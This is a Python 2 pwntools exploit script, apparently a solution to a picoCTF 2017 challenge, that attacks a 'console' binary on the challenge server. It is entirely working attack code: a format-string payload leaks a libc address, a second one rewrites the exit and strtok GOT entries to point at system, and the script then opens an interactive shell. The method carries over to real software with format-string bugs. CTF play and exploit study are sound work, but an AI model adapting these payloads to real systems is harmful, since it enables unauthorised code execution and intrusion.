#!/usr/bin/env python2
from pwn import *

BUFFER_OFFSET = 14
MODE = 'remote'

LOCAL_OFFSET = 0x830
REMOTE_OFFSET = 0xb45

def connect():
	if MODE == "local":
		return process(["./console","log.txt"])
	else:
		return remote("shell2017.picoctf.com",11496)

def get_libc_start_main_ret_address(r):
	buffer_offset = BUFFER_OFFSET
	
	payload = "e " # only set_exit_message is vulnerable
	payload += "%149$24p" # 149th argument is __libc_start_main_ret, align to 24
	payload += ";__libc_start_main;" # make it easy to find later
	payload += "A"*(0xbd-43) # loop address ends with 0xBD, but we need to substract bytes count we already written ("e " does not count as it is removed earlier) 
	payload += "%[]$hhn" # overwrite lowest byte of address
	payload += "A"*0x4C # second byte of loop address is 09, we need to overflow counter
	payload += "%[]$hhn" # overwrite second byte of address
	payload += "A"*(8-len(payload)%8) # pad to 8 bytes
	
	exit_got_plt = "\x58\x12\x60\x00\x00\x00\x00\x00"
	exit_got_plt2 = "\x59\x12\x60\x00\x00\x00\x00\x00"
	
	buffer_offset += len(payload)//8 #there will be exit_got_plt on stack
	buffer_offset2 = buffer_offset+1 #there will be exit_got_plt2 on stack
	
	assert((buffer_offset>=10) and (buffer_offset<99)) # just make sure both offsets are 2 digits (so our payload length is still divisible by 8)
	
	payload = payload.replace("[]",str(buffer_offset),1)
	payload = payload.replace("[]",str(buffer_offset2),1)
	
	assert(len(payload)<1008) # server only reads 1024 bytes
	
	r.send(payload+exit_got_plt+exit_got_plt2+"\n")
	
	data = r.recvuntil(";__libc_start_main")[:-18]
	return int(data[-24:].strip(),16)

def get_libc_base(libc_start_main_ret_addr):
	if MODE == 'local':
		return libc_start_main_ret_addr-0x20830
	else:
		return libc_start_main_ret_addr-0x21b45

def get_system_addr(libc_base):
	if MODE == 'local':
		return libc_base + 0x45390
	else:
		return libc_base + 0x41490

def overwrite_strtok_addr(r,system_addr):
	buffer_offset = BUFFER_OFFSET
	
	addr_byte1 = system_addr%256
	addr_byte2 = (system_addr>>8)%256
	addr_byte3 = (system_addr>>16)%256
	counter = 0
	
	payload = "e "
	payload += "A"*addr_byte1
	payload += "%[]$hhn"
	counter += addr_byte1
	
	to_write = (addr_byte2-counter)%256
	payload += "A"*to_write
	payload += "%[]$hhn"
	counter += to_write
	
	to_write = (addr_byte3-counter)%256
	payload += "A"*to_write
	payload += "%[]$hhn"
	counter += to_write
	
	payload += "A"*(8-len(payload)%8)
	
	buffer_offset += len(payload)//8
	buffer_offset2 = buffer_offset+1
	buffer_offset3 = buffer_offset+2
	
	assert((buffer_offset>=10) and (buffer_offset<98))
	
	payload = payload.replace("[]",str(buffer_offset),1)
	payload = payload.replace("[]",str(buffer_offset2),1)
	payload = payload.replace("[]",str(buffer_offset3),1)
	
	
	assert(len(payload)<1000)
	
	strtok_got_plt = "\x50\x12\x60\x00\x00\x00\x00\x00"
	strtok_got_plt2 = "\x51\x12\x60\x00\x00\x00\x00\x00"
	strtok_got_plt3 = "\x52\x12\x60\x00\x00\x00\x00\x00"
	
	r.send(payload+strtok_got_plt+strtok_got_plt2+strtok_got_plt3+"\n")
	r.recvuntil("Config action:") #saves you from watching hundreds of "A"s and the binary data
	r.recvuntil("Config action:") #runs twice 

def check_result(libc_start_main_ret_addr):
	if MODE == 'local':
		assert(libc_start_main_ret_addr%0x1000 == LOCAL_OFFSET)
	else:
		assert(libc_start_main_ret_addr%0x1000 == REMOTE_OFFSET)
	
r = connect()
libc_start_main_ret_addr = get_libc_start_main_ret_address(r)
check_result(libc_start_main_ret_addr)
libc_base = get_libc_base(libc_start_main_ret_addr)
system_addr = get_system_addr(libc_base)
overwrite_strtok_addr(r,system_addr)

r.interactive()